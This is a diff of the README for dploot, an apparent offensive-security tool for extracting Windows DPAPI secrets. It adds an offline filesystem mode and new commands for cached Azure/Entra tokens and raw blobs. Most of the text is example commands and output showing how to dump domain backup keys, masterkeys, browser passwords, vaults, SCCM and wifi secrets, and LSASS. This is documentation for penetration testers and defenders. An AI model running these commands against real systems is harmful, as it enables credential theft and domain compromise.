@@ -13,6 +13,7 @@ If you don't know what is DPAPI, [check out this post](https://posts.specterops.
     - [Kerberos](#kerberos)
   - [How to use](#how-to-use)
     - [As a local administrator on the machine](#as-a-local-administrator-on-the-machine)
+    - [With offline access to the Windows' filesystem](#with-offline-access-to-the-windows-filesystem)
     - [As a domain administrator (or equivalent)](#as-a-domain-administrator-or-equivalent)
     - [Not as a domain administrator](#not-as-a-domain-administrator)
   - [Commands](#commands)
@@ -35,8 +36,9 @@ If you don't know what is DPAPI, [check out this post](https://posts.specterops.
       - [sccm](#sccm)
       - [backupkey](#backupkey)
       - [mobaxterm](#mobaxterm)
+      - [wam](#wam)
+      - [blob](#blob)
   - [Credits](#credits)
-  - [TODO](#TODO)
 
 ## Installation
 
@@ -61,33 +63,39 @@ sudo apt install python3-dploot
 ## Usage
 
 ```text
-usage: dploot [-h] [-debug] [-quiet] {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi} ...
+dploot (https://github.com/zblurx/dploot) v3.0.0 by @_zblurx
+usage: dploot [-h]
+              {certificates,credentials,masterkeys,vaults,backupkey,blob,rdg,sccm,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi,mobaxterm,wam}
+              ...
 
-DPAPI looting remotely in Python
+DPAPI looting locally remotely in Python
 
 positional arguments:
-  {certificates,credentials,masterkeys,vaults,backupkey,rdg,triage,machinemasterkeys,machinecredentials,machinevaults,machinecertificates,machinetriage,browser,wifi}
+  {backupkey,blob,browser,certificates,credentials,machinecertificates,machinecredentials,machinemasterkeys,machinetriage,machinevaults,masterkeys,mobaxterm,rdg,sccm,triage,vaults,wam,wifi}
                         Action
-    certificates        Dump users certificates from remote target
-    credentials         Dump users Credential Manager blob from remote target
-    masterkeys          Dump users masterkey from remote target
-    vaults              Dump users Vaults blob from remote target
     backupkey           Backup Keys from domain controller
-    rdg                 Dump users saved password information for RDCMan.settings from remote target
-    triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from remote target
-    machinemasterkeys   Dump system masterkey from remote target
-    machinecredentials  Dump system credentials from remote target
-    machinevaults       Dump system vaults from remote target
+    blob                Decrypt DPAPI blob. Can fetch masterkeys on target
+    browser             Dump users credentials and cookies saved in browser from local or remote target
+    certificates        Dump users certificates from local or remote target
+    credentials         Dump users Credential Manager blob from local or remote target
     machinecertificates
-                        Dump system certificates from remote target
-    machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from remote target
-    browser             Dump users credentials and cookies saved in browser from remote target
-    wifi                Dump wifi profiles from remote target
+                        Dump system certificates from local or remote target
+    machinecredentials  Dump system credentials from local or remote target
+    machinemasterkeys   Dump system masterkey from local or remote target
+    machinetriage       Loot SYSTEM Masterkeys (if not set), SYSTEM credentials, SYSTEM certificates and SYSTEM vaults from local or remote
+                        target
+    machinevaults       Dump system vaults from local or remote target
+    masterkeys          Dump users masterkey from local or remote target
+    mobaxterm           Dump Passwords and Credentials from MobaXterm
+    rdg                 Dump users saved password information for RDCMan.settings from local or remote target
+    sccm                Dump SCCM secrets (NAA, Collection variables, tasks sequences credentials) from local or remote target
+    triage              Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from local or remote target
+    vaults              Dump users Vaults blob from local or remote target
+    wam                 Dump users cached azure tokens from local or remote target
+    wifi                Dump wifi profiles from local or remote target
 
 options:
   -h, --help            show this help message and exit
-  -debug                Turn DEBUG output ON
-  -quiet                Only output dumped credentials
 ```
 
 ### Kerberos
@@ -103,8 +111,23 @@ The goal of dploot is to simplify DPAPI related loot from a Linux box. As SharpD
 Whenever you are local administrator of a windows computer, you can loot machine secrets, for example with [machinecertificates](#machinecertificates) (or any other [Machine Triage](#machine-triage) commands, or [wifi](#wifi) command):
 
 ```text
-$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
+$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.14 -quiet
 [-] Writting certificate to DESKTOP-OJ3N8TJ.waza.local_796449B12B788ABA.pfx
+```
+
+### With offline access to the Windows' filesystem
+
+A different way of gaining local administrator access to a system, for instance via physical access, extracting the drive and mounting the filesystem directly on your machine. To use this mode, specify `LOCAL` as the target. By default the target filesystem is expected to be the current directory, you can specify a different path with `-root`:
+
+```text
+$ dploot sccm -root /media/C_drive/ LOCAL
+[*] Connected to LOCAL as \None (admin)
+```
+
+It can still be useful to give valid username and password as arguments, which will be used to decrypt masterkeys (see the instructions in [User Triage](#user-triage) below):
+```text
+$ dploot masterkeys -root /mnt -u bob -p Password LOCAL
+[*] Connected to LOCAL as \bob (admin)
 ```
 
 ### As a domain administrator (or equivalent)
@@ -113,13 +136,13 @@ If you have domain admin privileges, you can obtain the domain DPAPI backup key 
 
 To obtain the domain backupkey, you can use [backupkey](#backupkey) command:
 ```text
-$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
+$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.112 -quiet
 [-] Exporting domain backupkey to file key.pvk
 ```
 
 Then you can loot any user secrets stored on a windows domain-joined computer on the network, for example with [certificates](#certificates) command (or any other [User Triage](#user-triage) commands):
 ```
-$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -pvk key.pvk  -quiet
+$ dploot certificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.14 -pvk key.pvk  -quiet
 [-] Writting certificate to jsmith_waza.local_C0F800ECBA7BE997.pfx
 [-] Writting certificate to jsmith_waza.local_D0C73E2C04BEAAB0.pfx
 [-] Writting certificate to m.scott_waza.local_EB9C21A5642D4EBD.pfx
@@ -130,7 +153,7 @@ $ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.5
 If domain admin privileges have not been obtained (yet), using Mimikatz' sekurlsa::dpapi command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to dploot to triage the box. Use can also use [lsassy](https://github.com/Hackndo/lsassy) to harvest decrypted masterkeys:
 
 ```text
-$ lsassy -u Administrator -p 'Password!123' -d waza.local 192.168.56.14 -m rdrleakdiag -M masterkeys
+$ lsassy -u Administrator -p 'Password!123' -d waza.local -t 192.168.56.14 -m rdrleakdiag -M masterkeys
 [+] 192.168.56.14 Authentication successful
 [+] 192.168.56.14 Lsass dumped in C:\Windows\Temp\ff32F.fon (57121318 Bytes)
 [+] 192.168.56.14 Lsass dump deleted
@@ -142,7 +165,7 @@ $ lsassy -u Administrator -p 'Password!123' -d waza.local 192.168.56.14 -m rdrle
 Then you can use this masterkey file to loot the targeted computer, for example with [browser](#browser) command (or any other [User Triage](#user-triage) commands):
 
 ```text
-$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -mkfile /data/masterkeys
+$ dploot browser -d waza.local -u Administrator -p 'Password!123' -t 192.168.56.14 -mkfile /data/masterkeys
 [*] Connected to 192.168.56.14 as waza.local\Administrator (admin)
 
 [*] Triage Browser Credentials for ALL USERS
@@ -153,18 +176,20 @@ Username:	zblurx@gmail.com
 Password:	Waza1234
 ```
 
+You can also dump masterkey hashes with `-hashes-outputfile` option of [dploot masterkeys](#masterkeys)
+
 ## Commands
 
 ### User Triage
 
 #### masterkeys
 
-The **masterkeys** command will get any user masterkey file and decrypt them with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` domain backup key. It will return a set of masterkey {GUID}:SHA1 mappings. Note that it will try to use password or nthash that you used to connect to the target even if you don't specify corresponding options.
+The **masterkeys** command will get any user masterkey file and decrypt them with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` domain backup key. It will return a set of masterkey {GUID}:SHA1 mappings. Note that it will try to use password or nthash that you used to connect to the target even if you don't specify corresponding options. You can eventually use `-hashes-outputfile` to get every masterkey hashes in Hashcat/JtR format in order to crack cleartext password.
 
 *With domain backupkey*:
 
 ```text
-$ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
+$ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -pvk key.pvk
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -179,7 +204,7 @@ $ dploot masterkeys -d waza.local -u Administrator -p 'Password!123' 192.168.57.
 ```text
 $ cat passwords
 jsmith:Password#123
-$ dploot masterkeys -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -passwords passwords
+$ dploot masterkeys -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -passwords passwords
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -198,7 +223,7 @@ The **credentials** command will search for users Credential files and decrypt t
 With `mkfile`:
 
 ```text
-$ dploot credentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
+$ dploot credentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -mkfile waza.mkf
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage Credentials for ALL USERS
@@ -229,7 +254,7 @@ Unknown     : Password!123
 With `pvk`:
 
 ```text
-$ dploot credentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
+$ dploot credentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -pvk key.pvk
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -259,7 +284,7 @@ The **vaults** command will search for users Vaults secrets and decrypt them wit
 With `mkfile`:
 
 ```text
-$ dploot vaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -mkfile waza.local.mkf
+$ dploot vaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -mkfile waza.local.mkf
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage Vaults for ALL USERS
@@ -279,7 +304,7 @@ Decoded Password: test
 With `pvk`:
 
 ```text
-$ dploot vaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+$ dploot vaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -307,7 +332,7 @@ The **rdg** command will search for users RDCMan.settings files secrets and decr
 With `mkfile`:
 
 ```text
-$ dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -mkfile waza.local.mkf
+$ dploot rdg -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -mkfile waza.local.mkf
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage RDCMAN Settings and RDG files for ALL USERS
@@ -338,7 +363,7 @@ $ dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -mkfile waz
 With `pvk`:
 
 ```text
-dploot rdg -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+dploot rdg -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -379,7 +404,7 @@ The **certificates** command will search for users certificates from *MY* and de
 With `mkfile`:
 
 ```text
-$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
+$ dploot certificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -mkfile waza.mkf
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage Certificates for ALL USERS
@@ -411,7 +436,7 @@ DfaOwrwiSOoINEPSRHXEn2L7gjX111h1SqKCdLQ8s9mhR1F063lZzbEfGBNG7di0
 With `pvk`:
 
 ```text
-$ dploot certificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
+$ dploot certificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -pvk key.pvk
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -457,7 +482,7 @@ The **browser** command will search for users password and cookies in chrome bas
 With `mkfile`:
 
 ```text
-$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -mkfile waza.mkf
+$ dploot browser -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -mkfile waza.mkf
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage Browser Credentials for ALL USERS
@@ -471,7 +496,7 @@ Password:	Password!123
 With `pvk`:
 
 ```text
-$ dploot browser -d waza.local -u Administrator -p 'Password!123' 192.168.57.5 -pvk key.pvk
+$ dploot browser -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5 -pvk key.pvk
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -501,7 +526,7 @@ The **triage** command runs the user [credentials](#credentials), [vaults](#vaul
 The **machinemasterkeys** command will dump LSA secrets with RemoteRegistry to retrieve DPAPI_SYSTEM key which will the be used to decrypt any found machine masterkeys. It will return a set of masterkey {GUID}:SHA1 mappings.
 
 ```text
-$ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
+$ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -519,7 +544,7 @@ $ dploot machinemasterkeys -d waza.local -u Administrator -p 'Password!123' 192.
 The **machinecredentials** command will get any machine Credentials file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI XXX blob.
 
 ```text
-$ dploot machinecredentials -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
+$ dploot machinecredentials -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -550,7 +575,7 @@ Unknown     : Password!123
 The **machinevaults** command will get any machine Vaults file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI Vaults blob.
 
 ```text
-$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14
+$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -574,7 +599,7 @@ The **machinecertificates** command will get any machine private key file found 
 It will also dump machine CAPI certificates blob with RemoteRegistry.
 
 ```text
-$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
+$ dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -622,7 +647,7 @@ The machinetriage command runs the [machinecredentials](#machinecredentials), [m
 The **wifi** command will get any wifi xml configuration file  and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.
 
 ```text
-$ dploot wifi -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
+$ dploot wifi -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.5
 [*] Connected to 192.168.57.5 as waza.local\Administrator (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -676,7 +701,7 @@ EapHostConfig:
 The **sccm** command will retrieve NAA credentials, collection variables and tasks sequences credentials from the remote target and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob. Using `-wmi` will dump SCCM secrets from WMI requests results.
 
 ```text
-$ dploot sccm -d waza.local -u jsmith -p 'Password#123' 192.168.56.14
+$ dploot sccm -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -702,7 +727,7 @@ The **backupkey** command will retrieve the domain DPAPI backup key from a domai
 By default, this command will write the domain backup key into a file called key.pvk, but you can change this with `outputfile` flag. It is also possible to dump legacy backup key with `legacy` flag.
 
 ```text
-$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.57.20
+$ dploot backupkey -d waza.local -u Administrator -p 'Password!123' -t 192.168.57.20
 [*] Connected to dc01.waza.local as waza.local\e.cartman (admin)
 
 [DOMAIN BACKUPKEY V2]
@@ -727,7 +752,7 @@ The **mobaxterm** command will extract MobaXterm secrets and masterpassword key 
 With `pvk`:
 
 ```text
-dploot mobaxterm -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -pvk key.pvk
+dploot mobaxterm -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage ALL USERS masterkeys
@@ -747,6 +772,68 @@ Username:	mobauser@mobaserver
 Password:	309554moba231082pass322883
 ```
 
+### wam
+
+The **wam** command will search for TBRES files from Token Broker Cache and decrypt their content with `-mkfile FILE` of one or more {GUID}:SHA1, or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. 
+
+With `pvk`:
+
+```text
+dploot wam -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{d5efdaf1-9fd9-44e7-8bd1-7e017d458c14}:a7eac2a750069aa576e1e9f03f1dc37b2057adb3
+{13405569-1685-49c7-90e2-0e7ce55e5b8b}:ab1b23d3380c53ac1dae1cdf62bc44b4db391bb9
+
+[*] Triage Office Token Broken Cache for ALL USERS
+
+[TBRES FILE]
+Version: 1
+expiration: 133668881920000000
+responses: b'\x8aC\xed\x9f\xf4\xe6D!\x0c\x82\x86)\xab\x1d\xf9\xac'
+WTRes_Token: access_token=eyJhb[...]
+```
+
+***Tips***: *You can find Microsoft access token for Entra users in TBRES files.*
+
+### blob
+
+The **blob** command will decrypt DPAPI blob with `-mkfile FILE` of one or more {GUID}:SHA1, `-masterkey {GUID}:SHA1` or with `-passwords FILE` combo of user:password, `-nthashes` combo of user:nthash or a `-pvk PVKFILE` to first decrypt masterkeys. 
+
+With `pvk`:
+
+```text
+dploot blob -d waza.local -u jsmith -p 'Password#123' -t 192.168.56.14 -pvk key.pvk -blob 'AQAAANCMnd8BF[...]'
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage ALL USERS masterkeys
+
+{d5efdaf1-9fd9-44e7-8bd1-7e017d458c14}:a7eac2a750069aa576e1e9f03f1dc37b2057adb3
+{13405569-1685-49c7-90e2-0e7ce55e5b8b}:ab1b23d3380c53ac1dae1cdf62bc44b4db391bb9
+
+[*] Trying to decrypt DPAPI blob
+
+[BLOB]
+Version          :        1 (1)
+Guid Credential  : DF9D8CD0-1501-11D1-8C7A-00C04FC297EB
+MasterKeyVersion :        1 (1)
+Guid MasterKey   : 13405569-1685-49C7-90E2-0E7CE55E5B8B
+Flags            :        0 ()
+Description      :
+CryptAlgo        : 00006603 (26115) (CALG_3DES)
+Salt             : b'a5a15df8f0fb606897f28966dd5fcd9e'
+HMacKey          : b''
+HashAlgo         : 00008004 (32772) (CALG_SHA)
+HMac             : b'80b2dc6cee8d206d5dc5a9ef844f000a'
+Data             : b'5ece8ce1dd8[...]
+
+Data decrypted : b'0\x00\x00\x00\x01\x00\x00[...]' 
+```
+
+***Tips***: *You can find Microsoft access token for Entra users in TBRES files.*
+
 ## Credits
 
 Those projects helped a lot in writting this tool:
@@ -755,7 +842,4 @@ Those projects helped a lot in writting this tool:
 - [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) by [Harmj0y](https://twitter.com/harmj0y)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz/) by [gentilkiwi](https://twitter.com/gentilkiwi)
 - [DonPAPI](https://github.com/login-securite/DonPAPI) by [LoginSecurite](https://twitter.com/LoginSecurite)
-
-## TODO
-
-- Implement LOCAL triage (with extracted stuff)
+- [WAMBam](https://github.com/xpn/WAMBam) by [_xpn_](https://twitter.com/_xpn_)
